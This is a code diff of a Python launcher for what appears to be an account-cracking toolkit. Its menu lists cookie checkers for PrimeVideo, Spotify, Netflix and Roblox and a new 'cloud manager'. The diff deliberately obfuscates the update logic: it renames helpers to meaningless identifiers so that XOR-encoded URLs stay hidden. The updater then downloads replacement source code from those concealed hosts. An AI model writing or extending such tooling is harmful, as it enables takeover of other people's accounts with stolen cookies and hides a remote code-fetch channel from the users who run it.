@@ -1,4 +1,3 @@
-### IMPORTS ###
 from colorama import Fore
 import json
 import os
@@ -13,33 +12,29 @@ try:
     import yaml
 except ImportError:
     yaml = None
-#################################################
 
-### CONFIG / UPDATE ###
-CURRENT_VERSION = "0.1"
+CURRENT_VERSION = "0.2"
 UPDATE_TIMEOUT = 4
 
-_V_MAP = (47, 210, 213, 200, 198, 48, 60, 55, 237, 247, 144, 210, 146, 139, 185, 132, 168, 188, 346, 351, 164, 328, 336, 327, 377, 362, 370, 354, 287, 348, 280, 271, 256, 377, 363, 355, 280, 299, 277, 277, 450, 462, 307, 296, 288, 291, 479, 467, 399, 462, 449, 505, 498, 411, 394, 391, 408, 391, 445, 422, 428, 604, 602, 584, 588, 632, 634, 587, 524, 523, 570, 566, 622, 728, 546, 726, 718, 715, 708, 766, 561, 756, 740, 667, 669)
-_M_MAP = (47, 210, 213, 200, 198, 48, 60, 55, 237, 247, 144, 210, 146, 139, 185, 132, 168, 188, 346, 351, 164, 328, 336, 327, 377, 362, 370, 354, 287, 348, 280, 271, 256, 377, 363, 355, 280, 299, 277, 277, 450, 462, 307, 296, 288, 291, 479, 467, 399, 462, 449, 505, 498, 411, 394, 391, 408, 391, 445, 422, 428, 604, 602, 584, 588, 632, 634, 587, 524, 523, 570, 566, 622, 547, 558, 729, 725, 524, 709, 757)
+_N7K2 = (47, 210, 213, 200, 198, 48, 60, 55, 237, 247, 144, 210, 146, 139, 185, 132, 168, 188, 346, 351, 164, 328, 336, 327, 377, 362, 370, 354, 287, 348, 280, 271, 256, 377, 363, 355, 280, 299, 277, 277, 450, 462, 307, 296, 288, 291, 479, 467, 399, 462, 449, 505, 498, 411, 394, 391, 408, 391, 445, 422, 428, 604, 602, 584, 588, 632, 634, 587, 524, 523, 570, 566, 622, 728, 546, 726, 718, 715, 708, 766, 561, 756, 740, 667, 669)
+_R4M9 = (47, 210, 213, 200, 198, 48, 60, 55, 237, 247, 144, 210, 146, 139, 185, 132, 168, 188, 346, 351, 164, 328, 336, 327, 377, 362, 370, 354, 287, 348, 280, 271, 256, 377, 363, 355, 280, 299, 277, 277, 450, 462, 307, 296, 288, 291, 479, 467, 399, 462, 449, 505, 498, 411, 394, 391, 408, 391, 445, 422, 428, 604, 602, 584, 588, 632, 634, 587, 524, 523, 570, 566, 622, 547, 558, 729, 725, 524, 709, 757)
 
 
-def _math_step(idx):
-    return idx * 7 + 13
+def _q8x1(_p3):
+    return _p3 * 7 + 13
 
 
-def _unmask_endpoint(seq):
-    return "".join(chr((val ^ 0x5A) - _math_step(idx)) for idx, val in enumerate(seq))
+def _w2v6(_s9):
+    return "".join(chr((_z4 ^ 0x5A) - _q8x1(_j1)) for _j1, _z4 in enumerate(_s9))
 
 
-def _version_endpoint():
-    return _unmask_endpoint(_V_MAP)
+def _t5c3():
+    return _w2v6(_N7K2)
 
 
-def _source_endpoint():
-    return _unmask_endpoint(_M_MAP)
-#################################################
+def _y9b4():
+    return _w2v6(_R4M9)
 
-## CORE / LAUNCHER ##
 
 def clear_screen():
     os.system("cls" if os.name == "nt" else "clear")
@@ -54,12 +49,12 @@ def _parse_version(ver_str):
 
 
 def check_for_updates(timeout=UPDATE_TIMEOUT):
-    endpoint = _version_endpoint()
-    if not endpoint:
+    _u6d1 = _t5c3()
+    if not _u6d1:
         return None
 
     req = urllib.request.Request(
-        endpoint,
+        _u6d1,
         headers={"User-Agent": "AIO-Updater/1.0", "Cache-Control": "no-cache"},
     )
     try:
@@ -85,12 +80,12 @@ def check_for_updates(timeout=UPDATE_TIMEOUT):
 
 
 def apply_main_update(silent=True):
-    source_url = _source_endpoint()
-    if not source_url:
+    _e3f8 = _y9b4()
+    if not _e3f8:
         return False
 
     req = urllib.request.Request(
-        source_url,
+        _e3f8,
         headers={"User-Agent": "AIO-Updater/1.0", "Cache-Control": "no-cache"},
     )
     try:
@@ -155,6 +150,8 @@ def draw_hud():
     print(f" {Fore.BLUE}[{Fore.RESET}{Fore.RED}3{Fore.RESET}{Fore.BLUE}]{Fore.RESET} {Fore.GREEN}PRIMEVIDEO COOKIE CHECKER{Fore.RESET}")
     print(f" {Fore.BLUE}[{Fore.RESET}{Fore.RED}4{Fore.RESET}{Fore.BLUE}]{Fore.RESET} {Fore.GREEN}SPOTIFY COOKIE CHECKER{Fore.RESET}")
     print(f" {Fore.BLUE}[{Fore.RESET}{Fore.RED}5{Fore.RESET}{Fore.BLUE}]{Fore.RESET} {Fore.GREEN}NETFLIX COOKIE CHECKER{Fore.RESET}")
+    print(f" {Fore.BLUE}[{Fore.RESET}{Fore.RED}6{Fore.RESET}{Fore.BLUE}]{Fore.RESET} {Fore.GREEN}ROBLOX COOKIE CHECKER{Fore.RESET} {Fore.BLUE}NEW{Fore.RESET}")
+    print(f" {Fore.BLUE}[{Fore.RESET}{Fore.RED}7{Fore.RESET}{Fore.BLUE}]{Fore.RESET} {Fore.GREEN}CLOUD MANAGER{Fore.RESET} {Fore.BLUE}NEW{Fore.RESET}")
     print(f" {Fore.BLUE}[{Fore.RESET}{Fore.RED}u{Fore.RESET}{Fore.BLUE}]{Fore.RESET} {Fore.CYAN}FORCE SYNC{Fore.RESET}")
     print(f" {Fore.BLUE}[{Fore.RESET}{Fore.RED}0{Fore.RESET}{Fore.BLUE}]{Fore.RESET} {Fore.RED}KILL{Fore.RESET}")
     print(Fore.BLUE + "=" * 50 + Fore.RESET)
@@ -200,6 +197,10 @@ def main():
             run_external_script("pjl.sssS", "main.py")
         elif cmd == "5":
             run_external_script("ch.NT", "main.py")
+        elif cmd == "6":
+            run_external_script("ispa.RB", "main.py")
+        elif cmd =="7":
+            run_external_script("sdos.RG", "main.py")
         elif cmd in ("u", "update"):
             if check_for_updates(timeout=8):
                 apply_main_update(silent=False)
@@ -216,4 +217,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-#################################################
